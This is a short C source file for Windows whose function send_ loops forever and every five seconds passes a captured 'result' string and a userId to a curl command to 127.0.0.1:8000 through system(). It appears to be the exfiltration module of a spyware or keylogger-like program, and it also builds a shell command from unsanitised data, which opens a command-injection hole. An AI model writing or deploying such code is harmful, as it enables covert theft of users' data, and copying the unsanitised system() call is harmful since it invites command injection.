#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "sender.h"


void send_(void* param) {
    while (1) {
        if (result != NULL && strlen(result) > 0) {
            char buffer[3900];
            snprintf(buffer, sizeof(buffer), "curl 127.0.0.1:8000/%s/%s", result, userId);   
            system(buffer); 
            result[0] = '\0';
        }
        Sleep(5000);
    }
}
